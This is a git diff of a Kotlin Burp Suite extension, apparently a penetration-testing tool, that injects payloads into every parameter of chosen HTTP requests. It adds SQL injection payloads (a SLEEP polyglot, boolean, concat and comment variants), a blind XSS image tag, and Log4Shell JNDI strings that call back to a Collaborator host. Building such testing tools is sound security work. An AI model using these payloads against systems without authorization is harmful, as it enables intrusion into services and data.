@@ -2,6 +2,8 @@ package com.nickcoblentz.montoya
 
 import burp.api.montoya.BurpExtension
 import burp.api.montoya.MontoyaApi
+import burp.api.montoya.http.RedirectionMode
+import burp.api.montoya.http.RequestOptions
 import burp.api.montoya.http.message.HttpRequestResponse
 import burp.api.montoya.http.message.params.HttpParameter
 import burp.api.montoya.http.message.params.HttpParameterType
@@ -13,11 +15,11 @@ import burp.api.montoya.ui.contextmenu.ContextMenuEvent
 import burp.api.montoya.ui.contextmenu.ContextMenuItemsProvider
 import burp.api.montoya.ui.contextmenu.WebSocketContextMenuEvent
 import burp.api.montoya.utilities.Base64EncodingOptions
+import com.nickcoblentz.montoya.settings.*
 import java.awt.Component
 import java.awt.event.ActionEvent
 import java.util.concurrent.Executors
 import javax.swing.JMenuItem
-import java.lang.Math;
 
 enum class PayloadType {
     REPLACE,
@@ -30,14 +32,23 @@ class EveryParameter : BurpExtension, ContextMenuItemsProvider {
 
     private lateinit var logger: MontoyaLogger
     private lateinit var api: MontoyaApi
-    private val sqliMenuItem = JMenuItem("SQLi")
+    private val sqliQuickMenuItem = JMenuItem("SQLi Quick")
+    private val sqliLogicPayloadsMenuItem = JMenuItem("SQLi Logic Payloads")
+    private val sqliConcatPayloadsMenuItem = JMenuItem("SQLi Concat Payloads")
+    private val sqliSingleQuoteCommentPayloadsMenuItem = JMenuItem("SQLi SingleQuoteCommentPayloads")
+    private val sqliDoubleQuoteCommentPayloadsMenuItem = JMenuItem("SQLi DoubleQuoteCommentPayloads")
+    private val sqliErrorPayloadsMenuItem = JMenuItem("SQLi ErrorPayloads")
     private val xssMapMenuItem = JMenuItem("XSS ASDF")
     private val xssPayloadsMenuItem = JMenuItem("XSS Payloads")
-    private val blindXssImgMenuItem = JMenuItem("Blind XSS Img")
+    private val blindXssImgMenuItem = JMenuItem("XSS Blind Img")
+    private val collabUrlMenuItem = JMenuItem("Collab Url")
+    private val log4jCollabMenuItem = JMenuItem("Log4J Collab")
     private val minimizeMenuItem = JMenuItem("Minimize")
-    private val allMenuItems = mutableListOf<Component>(sqliMenuItem,xssMapMenuItem,xssPayloadsMenuItem,blindXssImgMenuItem,minimizeMenuItem)
+    private val allMenuItems = mutableListOf<Component>(sqliQuickMenuItem,sqliErrorPayloadsMenuItem,sqliConcatPayloadsMenuItem,sqliSingleQuoteCommentPayloadsMenuItem,sqliDoubleQuoteCommentPayloadsMenuItem,sqliLogicPayloadsMenuItem,xssMapMenuItem,xssPayloadsMenuItem,blindXssImgMenuItem,collabUrlMenuItem,log4jCollabMenuItem,minimizeMenuItem)
     private var currentHttpRequestResponseList = mutableListOf<HttpRequestResponse>()
     private val executor = Executors.newVirtualThreadPerTaskExecutor()
+    private lateinit var followRedirectSetting : BooleanExtensionSetting
+    private lateinit var ignoreParametersSetting : ListStringExtensionSetting
 
     companion object {
         private const val PLUGIN_NAME: String = "Every Parameter"
@@ -52,12 +63,36 @@ class EveryParameter : BurpExtension, ContextMenuItemsProvider {
         logger.debugLog("Starting...")
         api.extension().setName(PLUGIN_NAME)
         api.userInterface().registerContextMenuItemsProvider(this)
-        sqliMenuItem.addActionListener({ e -> sqliActionPerformed(e) })
+        sqliQuickMenuItem.addActionListener({ e -> sqliQuickActionPerformed(e) })
+        sqliLogicPayloadsMenuItem.addActionListener({ e -> sqliLogicPayloadsActionPerformed(e) })
+        sqliConcatPayloadsMenuItem.addActionListener({ e -> sqliConcatPayloadsActionPerformed(e) })
+        sqliSingleQuoteCommentPayloadsMenuItem.addActionListener({ e -> sqliSingleQuoteCommentPayloadsActionPerformed(e) })
+        sqliDoubleQuoteCommentPayloadsMenuItem.addActionListener({ e -> sqliDoubleQuoteCommentPayloadsActionPerformed(e) })
+        sqliErrorPayloadsMenuItem.addActionListener({ e -> sqliErrorPayloadsActionPerformed(e) })
         xssMapMenuItem.addActionListener({ e -> xssMapActionPerformed(e) })
         xssPayloadsMenuItem.addActionListener({ e -> xssPayloadsActionPerformed(e) })
         xssPayloadsMenuItem.addActionListener({ e -> xssPayloadsActionPerformed(e) })
         blindXssImgMenuItem.addActionListener({ e -> blindXssImgActionPerformed(e) })
+        collabUrlMenuItem.addActionListener({ e -> collabUrlActionPerformed(e) })
         minimizeMenuItem.addActionListener({ e -> minimizeActionPerformed(e) })
+        log4jCollabMenuItem.addActionListener({ e -> log4jCollabActionPerformed(e) })
+        followRedirectSetting = BooleanExtensionSetting(
+            api,
+            "Follow Redirects?",
+            "everyparam.followRedirect",
+            false,
+            ExtensionSettingSaveLocation.PROJECT)
+        ignoreParametersSetting = ListStringExtensionSetting(
+            api,
+            "Ignore the following Parameters",
+            "everyparam.ignoreParam",
+            mutableListOf<String>(),
+            ExtensionSettingSaveLocation.PROJECT
+        )
+        val formGenerator = GenericExtensionSettingsFormGenerator(listOf(followRedirectSetting,ignoreParametersSetting),PLUGIN_NAME)
+        val settingsFormBuilder = formGenerator.getSettingsFormBuilder()
+        val settingsForm = settingsFormBuilder.run()
+        api.userInterface().registerContextMenuItemsProvider(ExtensionSettingsContextMenuProvider(api, settingsForm))
         logger.debugLog("...Finished")
     }
 
@@ -81,25 +116,56 @@ class EveryParameter : BurpExtension, ContextMenuItemsProvider {
         return mutableListOf<Component>()
     }
 
-    fun sqliActionPerformed(event: ActionEvent?) {
+
+    fun sqliQuickActionPerformed(event: ActionEvent?) {
         logger.debugLog("Enter")
         val myHttpRequestResponses = currentHttpRequestResponseList.toList()
-        iterateThroughParametersWithPayload(myHttpRequestResponses,"'",PayloadType.END, "SQLi '")
-        iterateThroughParametersWithPayload(myHttpRequestResponses,"\"",PayloadType.END, "SQLi \"")
-        iterateThroughParametersWithPayload(myHttpRequestResponses,"'+'",PayloadType.MIDDLE, "SQLi concat +'")
-        iterateThroughParametersWithPayload(myHttpRequestResponses,"'||'",PayloadType.MIDDLE, "SQLi concat ||'")
-        iterateThroughParametersWithPayload(myHttpRequestResponses,"' '",PayloadType.MIDDLE, "SQLi concat space'")
-        iterateThroughParametersWithPayload(myHttpRequestResponses,"'-- ",PayloadType.END, "SQLi comment'")
-        iterateThroughParametersWithPayload(myHttpRequestResponses,"')-- ",PayloadType.END, "SQLi comment)'")
-        iterateThroughParametersWithPayload(myHttpRequestResponses,"\"+\"",PayloadType.MIDDLE, "SQLi concat +\"")
-        iterateThroughParametersWithPayload(myHttpRequestResponses,"\"||\"",PayloadType.MIDDLE, "SQLi concat ||\"")
-        iterateThroughParametersWithPayload(myHttpRequestResponses,"\" \"",PayloadType.MIDDLE, "SQLi concat space\"")
-        iterateThroughParametersWithPayload(myHttpRequestResponses,"\"-- ",PayloadType.END, "SQLi comment\"")
-        iterateThroughParametersWithPayload(myHttpRequestResponses,"\")-- ",PayloadType.END, "SQLi comment )\"")
+        iterateThroughParametersWithPayload(myHttpRequestResponses,"SLEEP(10) /*' or SLEEP(10) or'\" or SLEEP(10) or \"*/",PayloadType.END, "SQLi Polyglot \"")
+        logger.debugLog("Exit")
+    }
+
+    fun sqliLogicPayloadsActionPerformed(event: ActionEvent?) {
+        logger.debugLog("Enter")
+        val myHttpRequestResponses = currentHttpRequestResponseList.toList()
         iterateThroughParametersWithPayload(myHttpRequestResponses,"' or 'a'='a' or 'a'='",PayloadType.END, "SQLi boolean a'")
         iterateThroughParametersWithPayload(myHttpRequestResponses," or 1=1 or 1=",PayloadType.END, "SQLi boolean 1'")
         iterateThroughParametersWithPayload(myHttpRequestResponses,"' or 'a'='a' or 'a'='",PayloadType.END, "SQLi boolean a\"")
         iterateThroughParametersWithPayload(myHttpRequestResponses," or 1=1 or 1=",PayloadType.END, "SQLi boolean 1\"")
+        logger.debugLog("Exit")
+    }
+
+    fun sqliConcatPayloadsActionPerformed(event: ActionEvent?) {
+        logger.debugLog("Enter")
+        val myHttpRequestResponses = currentHttpRequestResponseList.toList()
+        iterateThroughParametersWithPayload(myHttpRequestResponses,"'+'",PayloadType.MIDDLE, "SQLi concat +'")
+        iterateThroughParametersWithPayload(myHttpRequestResponses,"'||'",PayloadType.MIDDLE, "SQLi concat ||'")
+        iterateThroughParametersWithPayload(myHttpRequestResponses,"' '",PayloadType.MIDDLE, "SQLi concat space'")
+        iterateThroughParametersWithPayload(myHttpRequestResponses,"\"+\"",PayloadType.MIDDLE, "SQLi concat +\"")
+        iterateThroughParametersWithPayload(myHttpRequestResponses,"\"||\"",PayloadType.MIDDLE, "SQLi concat ||\"")
+        iterateThroughParametersWithPayload(myHttpRequestResponses,"\" \"",PayloadType.MIDDLE, "SQLi concat space\"")
+        logger.debugLog("Exit")
+    }
+
+    fun sqliSingleQuoteCommentPayloadsActionPerformed(event: ActionEvent?) {
+        logger.debugLog("Enter")
+        val myHttpRequestResponses = currentHttpRequestResponseList.toList()
+        iterateThroughParametersWithPayload(myHttpRequestResponses,"'-- ",PayloadType.END, "SQLi comment'")
+        iterateThroughParametersWithPayload(myHttpRequestResponses,"')-- ",PayloadType.END, "SQLi comment)'")
+        logger.debugLog("Exit")
+    }
+
+    fun sqliDoubleQuoteCommentPayloadsActionPerformed(event: ActionEvent?) {
+        logger.debugLog("Enter")
+        val myHttpRequestResponses = currentHttpRequestResponseList.toList()
+        iterateThroughParametersWithPayload(myHttpRequestResponses,"\"-- ",PayloadType.END, "SQLi comment'")
+        iterateThroughParametersWithPayload(myHttpRequestResponses,"\")-- ",PayloadType.END, "SQLi comment)'")
+        logger.debugLog("Exit")
+    }
+
+    fun sqliErrorPayloadsActionPerformed(event: ActionEvent?) {
+        logger.debugLog("Enter")
+        val myHttpRequestResponses = currentHttpRequestResponseList.toList()
+        iterateThroughParametersWithPayload(myHttpRequestResponses,"'\"",PayloadType.END, "SQLi '\"")
         logger.debugLog("Exit")
     }
 
@@ -114,6 +180,21 @@ class EveryParameter : BurpExtension, ContextMenuItemsProvider {
         logger.debugLog("Enter")
         val myHttpRequestResponses = currentHttpRequestResponseList.toList()
         iterateThroughParametersWithPayload(myHttpRequestResponses,"'\"><img src=\"https://${api.collaborator().defaultPayloadGenerator().generatePayload().toString()}/blindimg.png\">asdf",PayloadType.END, "Bind XSS Img")
+        logger.debugLog("Exit")
+    }
+
+    fun collabUrlActionPerformed(event: ActionEvent?) {
+        logger.debugLog("Enter")
+        val myHttpRequestResponses = currentHttpRequestResponseList.toList()
+        iterateThroughParametersWithPayload(myHttpRequestResponses,"https://${api.collaborator().defaultPayloadGenerator().generatePayload().toString()}/collaburl",PayloadType.REPLACE, "Collab URL")
+        logger.debugLog("Exit")
+    }
+
+    fun log4jCollabActionPerformed(event: ActionEvent?) {
+        logger.debugLog("Enter")
+        val myHttpRequestResponses = currentHttpRequestResponseList.toList()
+        iterateThroughParametersWithPayload(myHttpRequestResponses,"\${jndi:ldap://${api.collaborator().defaultPayloadGenerator().generatePayload().toString()}/}",PayloadType.REPLACE, "log4j ldap")
+        iterateThroughParametersWithPayload(myHttpRequestResponses,"\${jndi:dns://${api.collaborator().defaultPayloadGenerator().generatePayload().toString()}/}",PayloadType.REPLACE, "log4j dns")
         logger.debugLog("Exit")
     }
 
@@ -155,7 +236,7 @@ class EveryParameter : BurpExtension, ContextMenuItemsProvider {
 
                             if (supportedParamaterTypes.contains(parameter.type())) {
                                 val modifiedRequest = currentRequest.withRemovedParameters(parameter)
-                                val httpRequestResponseResult = api.http().sendRequest(modifiedRequest)
+                                val httpRequestResponseResult = sendRequestConsiderSettings(modifiedRequest)
                                 if (responsesAreSimilar(originalResponse, httpRequestResponseResult.response()))
                                     currentRequest = modifiedRequest
                             }
@@ -201,23 +282,84 @@ class EveryParameter : BurpExtension, ContextMenuItemsProvider {
             for(parameter in httpRequest.parameters())
             {
                 logger.debugLog("Found param: ${parameter.name()}, ${parameter.type()}, ${parameter.value()}")
-                when(parameter.type()) {
-                    HttpParameterType.URL ->
-                        sendRequest(httpRequest.withUpdatedParameters(createUpdatedParameter(parameter,api.utilities().urlUtils().encode(payload))),"URL Param: ${parameter.name()}: $annotation")
-                    HttpParameterType.BODY ->
-                        sendRequest(httpRequest.withUpdatedParameters(createUpdatedParameter(parameter,api.utilities().urlUtils().encode(payload))),"Body Param: ${parameter.name()}: $annotation")
-                    HttpParameterType.COOKIE ->
-                        sendRequest(httpRequest.withUpdatedParameters(createUpdatedParameter(parameter,api.utilities().urlUtils().encode(payload))),"Cookie: ${parameter.name()}: $annotation")
-                    HttpParameterType.MULTIPART_ATTRIBUTE ->
-                        sendRequest(httpRequest.withUpdatedParameters(createUpdatedParameter(parameter,payload)),"mutipart Param: ${parameter.name()}: $annotation")
-                    HttpParameterType.JSON ->
-                        sendRequest(matchReplaceParameterInRequest(httpRequest,parameter,payload.replace("\"","\\\"")),"URL JSON: ${parameter.name()}: $annotation")
-                    HttpParameterType.XML ->
-                        sendRequest(matchReplaceParameterInRequest(httpRequest,parameter,api.utilities().htmlUtils().encode(payload)),"URL XML: ${parameter.name()}: $annotation")
-                    HttpParameterType.XML_ATTRIBUTE ->
-                        sendRequest(matchReplaceParameterInRequest(httpRequest,parameter,api.utilities().htmlUtils().encode(payload)),"URL XML Attr: ${parameter.name()}: $annotation")
-                    else -> Unit
+                logger.debugLog("List of ignored values:\n${ignoreParametersSetting.currentValue}")
+
+                if(!ignoreParametersSetting.currentValue.any { parameter.name().equals(it,ignoreCase = true) }) {
+                    when (parameter.type()) {
+                        HttpParameterType.URL ->
+                            sendRequest(
+                                httpRequest.withUpdatedParameters(
+                                    createUpdatedParameter(
+                                        parameter,
+                                        api.utilities().urlUtils().encode(payload)
+                                    )
+                                ), "URL Param: ${parameter.name()}: $annotation"
+                            )
+
+                        HttpParameterType.BODY ->
+                            sendRequest(
+                                httpRequest.withUpdatedParameters(
+                                    createUpdatedParameter(
+                                        parameter,
+                                        api.utilities().urlUtils().encode(payload)
+                                    )
+                                ), "Body Param: ${parameter.name()}: $annotation"
+                            )
+
+                        HttpParameterType.COOKIE ->
+                            sendRequest(
+                                httpRequest.withUpdatedParameters(
+                                    createUpdatedParameter(
+                                        parameter,
+                                        api.utilities().urlUtils().encode(payload)
+                                    )
+                                ), "Cookie: ${parameter.name()}: $annotation"
+                            )
+
+                        HttpParameterType.MULTIPART_ATTRIBUTE ->
+                            sendRequest(
+                                httpRequest.withUpdatedParameters(createUpdatedParameter(parameter, payload)),
+                                "mutipart Param: ${parameter.name()}: $annotation"
+                            )
+
+                        HttpParameterType.JSON ->
+                            sendRequest(
+                                matchReplaceParameterInRequest(
+                                    httpRequest,
+                                    parameter,
+                                    payload.replace("\"", "\\\"")
+                                ), "URL JSON: ${parameter.name()}: $annotation"
+                            )
+
+                        HttpParameterType.XML -> {
+                            sendRequest(
+                                matchReplaceParameterInRequest(
+                                    httpRequest,
+                                    parameter,
+                                    api.utilities().htmlUtils().encode(payload)
+                                ), "URL XML: ${parameter.name()}: $annotation"
+                            )
+                            sendRequest(
+                                matchReplaceParameterInRequest(httpRequest, parameter, "<![CDATA[$payload]]>"),
+                                "URL XML: ${parameter.name()}: $annotation"
+                            )
+                        }
+
+                        HttpParameterType.XML_ATTRIBUTE ->
+                            sendRequest(
+                                matchReplaceParameterInRequest(
+                                    httpRequest,
+                                    parameter,
+                                    api.utilities().htmlUtils().encode(payload)
+                                ), "URL XML Attr: ${parameter.name()}: $annotation"
+                            )
+
+                        else -> Unit
+                    }
                 }
+                else
+                    logger.debugLog("Skipping ${parameter.name()}")
+
             }
         }
         logger.debugLog("Exit")
@@ -236,8 +378,17 @@ class EveryParameter : BurpExtension, ContextMenuItemsProvider {
         logger.debugLog("Enter")
         executor.submit {
             val annotatedHttpRequest = httpRequest.withAddedHeader("x-everyparam",api.utilities().base64Utils().encode(annotation,Base64EncodingOptions.URL).toString())
-            api.http().sendRequest(annotatedHttpRequest)
+            sendRequestConsiderSettings(annotatedHttpRequest)
+
         }
         logger.debugLog("Exit")
     }
+
+    fun sendRequestConsiderSettings(httpRequest : HttpRequest) : HttpRequestResponse {
+        if(followRedirectSetting.currentValue)
+            return api.http().sendRequest(httpRequest,RequestOptions.requestOptions().withRedirectionMode(RedirectionMode.ALWAYS))
+        else
+            return api.http().sendRequest(httpRequest)
+    }
+
 }
